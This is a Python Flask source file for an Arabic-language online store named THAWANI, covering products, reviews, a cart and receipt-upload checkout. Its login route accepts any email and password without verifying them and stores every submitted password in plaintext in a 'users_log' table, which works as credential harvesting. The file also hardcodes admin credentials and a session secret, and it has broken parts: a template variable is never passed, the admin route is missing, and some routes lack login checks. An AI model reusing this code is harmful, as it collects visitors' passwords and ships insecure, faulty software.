from flask import Flask, request, render_template_string, redirect, session, url_for
import os, sqlite3, uuid, datetime

app = Flask(__name__)
app.secret_key = "thawani_ultra_max_2026_final"
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- إعداد قاعدة البيانات الشاملة ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
    c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, 
        card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    conn.commit(); conn.close()

init_db()

ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
ADMIN_PASS = "qaws54321"

# --- التنسيق الفخم ---
CSS = """
<style>
    :root { --main: #1a1a1a; --accent: #ffd700; --bg: #f4f4f4; --text: #333; --white: #ffffff; }
    body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; direction: rtl; color: var(--text); padding-bottom: 60px; }
    header { background: var(--main); padding: 15px; display: flex; justify-content: space-between; align-items: center; color: var(--accent); position: sticky; top:0; z-index:1000; }
    .btn-buy { background: var(--main); color: var(--accent); border: none; padding: 10px; border-radius: 5px; cursor: pointer; text-decoration: none; text-align: center; font-weight: bold; display: inline-block; width: 100%; margin-top: 10px; }
    .card { background: white; border-radius: 8px; padding: 10px; margin: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
    input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
    .star-rating { color: #ffd700; font-size: 20px; }
    .order-status { padding: 5px 10px; border-radius: 20px; font-size: 12px; background: #eee; }
</style>
"""

HEADER_HTML = f"<!DOCTYPE html><html dir='rtl' lang='ar'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>{CSS}</head><body>"

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    prods = conn.execute("SELECT * FROM products").fetchall()
    cats = conn.execute("SELECT * FROM categories").fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header>
        <span style="font-size:20px; font-weight:bold;">THAWANI</span>
        <div style="display:flex; gap:15px;">
            <a href="/orders_history" style="text-decoration:none;">📦 طلباتي</a>
            <a href="/cart" style="text-decoration:none;">🛒 السلة</a>
            {% if session.is_admin %}<a href="/admin">⚙️</a>{% endif %}
        </div>
    </header>
    <div style="display: grid; grid-template-columns: 1fr 1fr; padding: 5px;">
        {% for p in prods %}
        <div class="card">
            <img src="/static/uploads/{{p.img}}" style="width:100%; border-radius:5px;">
            <div style="font-weight:bold; font-size:14px; margin-top:5px;">{{p.name}}</div>
            <div style="color:red; font-weight:bold;">{{p.price}} OMR</div>
            <a href="/product/{{p.id}}" class="btn-buy">عرض</a>
        </div>
        {% endfor %}
    </div>
    """, prods=prods)

@app.route('/product/<int:id>', methods=['GET', 'POST'])
def product(id):
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        conn.execute("INSERT INTO reviews (product_id, user_email, rating, comment) VALUES (?,?,?,?)", (id, session['user'], request.form['rating'], request.form['comment']))
        conn.commit()
    p = conn.execute("SELECT * FROM products WHERE id=?", (id,)).fetchone()
    revs = conn.execute("SELECT * FROM reviews WHERE product_id=? ORDER BY id DESC", (id,)).fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="color:var(--accent); text-decoration:none;">🔙 عودة</a></header>
    <div class="card">
        <img src="/static/uploads/{{p.img}}" style="width:100%;">
        <h2>{{p.name}}</h2>
        <h3 style="color:red;">{{p.price}} OMR</h3>
        <a href="/add_to_cart/{{p.id}}" class="btn-buy">إضافة للسلة 🛒</a>
        <hr>
        <h4>التقييمات ⭐</h4>
        {% for r in revs %}
            <div style="border-bottom:1px solid #eee; padding:5px;">
                <div class="star-rating">{{ "★" * r.rating }}{{ "☆" * (5 - r.rating) }}</div>
                <p>{{r.comment}}</p>
            </div>
        {% endfor %}
        <form method="POST" style="margin-top:15px;">
            <select name="rating"><option value="5">⭐⭐⭐⭐⭐</option><option value="4">⭐⭐⭐⭐</option><option value="3">⭐⭐⭐</option><option value="2">⭐⭐</option><option value="1">⭐</option></select>
            <textarea name="comment" placeholder="اكتب رأيك بالمنتج..."></textarea>
            <button class="btn-buy">إرسال التقييم</button>
        </form>
    </div>""", p=p, revs=revs)

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    
    if request.method == 'POST':
        f = request.files['receipt']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
        details = ", ".join([f"{i['name']} ({i['quantity']})" for i in items])
        conn.execute("INSERT INTO orders (user_email, full_name, phone, card_img, items_details, total_price) VALUES (?,?,?,?,?,?)", 
                     (session['user'], request.form['name'], request.form['phone'], fname, details, total))
        conn.execute("DELETE FROM cart WHERE user_email=?", (session['user'],))
        conn.commit(); conn.close()
        return redirect('/orders_history')
    
    return render_template_string(HEADER_HTML + """
    <div class="card">
        <h3>إتمام الطلب 💳</h3>
        <p>الإجمالي: {{total}} OMR</p>
        <form method="POST" enctype="multipart/form-data">
            <input name="name" placeholder="الاسم الكامل" required>
            <input name="phone" placeholder="رقم الواتساب" required>
            <p style="font-size:12px; color:gray;">ارفق صورة تحويل المبلغ (إيصال الدفع):</p>
            <input type="file" name="receipt" accept="image/*" required>
            <button class="btn-buy">تأكيد الطلب وإرسال</button>
        </form>
    </div>""", total=total)

@app.route('/orders_history')
def orders_history():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    orders = conn.execute("SELECT * FROM orders WHERE user_email=? ORDER BY id DESC", (session['user'],)).fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="color:var(--accent); text-decoration:none;">🔙 عودة</a> <h3>طلباتي</h3> <div></div></header>
    <div style="padding:10px;">
        {% for o in orders %}
        <div class="card">
            <div style="display:flex; justify-content:space-between;">
                <b>طلب #{{o.id}}</b>
                <span class="order-status">{{o.status}}</span>
            </div>
            <p style="font-size:13px; color:#666;">{{o.items_details}}</p>
            <div style="font-weight:bold; color:var(--main);">{{o.total_price}} OMR</div>
            <div style="font-size:11px; color:gray;">{{o.time}}</div>
        </div>
        {% else %}
        <p style="text-align:center; margin-top:50px;">لا توجد طلبات سابقة.</p>
        {% endfor %}
    </div>""")

# --- لوحة الإدارة وسجل الدخول (محفوظة بالكامل) ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        e, p = request.form['email'], request.form['password']
        conn = sqlite3.connect('database.db')
        conn.execute("INSERT INTO users_log (email, password) VALUES (?,?)", (e, p))
        conn.commit(); conn.close()
        session['user'], session['is_admin'] = e, (e == ADMIN_MAIL and p == ADMIN_PASS)
        return redirect('/')
    return render_template_string(HEADER_HTML + """
    <div style="background:var(--main); min-height:100vh; display:flex; align-items:center; justify-content:center;">
        <div style="background:white; padding:30px; border-radius:15px; width:80%;">
            <h2 style="text-align:center;">دخول متجر ثواني</h2>
            <form method="POST"><input name="email" type="email" placeholder="البريد الإلكتروني" required><input name="password" type="password" placeholder="كلمة المرور" required><button class="btn-buy">دخول</button></form>
        </div>
    </div>""")

@app.route('/cart')
def cart():
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="color:var(--accent); text-decoration:none;">🔙</a> <h3>السلة</h3> <div></div></header>
    <div style="padding:10px;">
        {% for i in items %}
        <div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #ddd;">
            <span>{{i.name}} (x{{i.quantity}})</span>
            <b>{{i.price * i.quantity}} OMR</b>
        </div>
        {% endfor %}
        <h3 style="text-align:center;">الإجمالي: {{total}} OMR</h3>
        <a href="/checkout" class="btn-buy">إتمام الطلب 💳</a>
    </div>""", items=items, total=total)

@app.route('/add_to_cart/<int:id>')
def add_to_cart(id):
    conn = sqlite3.connect('database.db')
    conn.execute("INSERT INTO cart (user_email, product_id) VALUES (?,?)", (session['user'], id))
    conn.commit(); conn.close()
    return redirect('/cart')

@app.route('/logout')
def logout(): session.clear(); return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
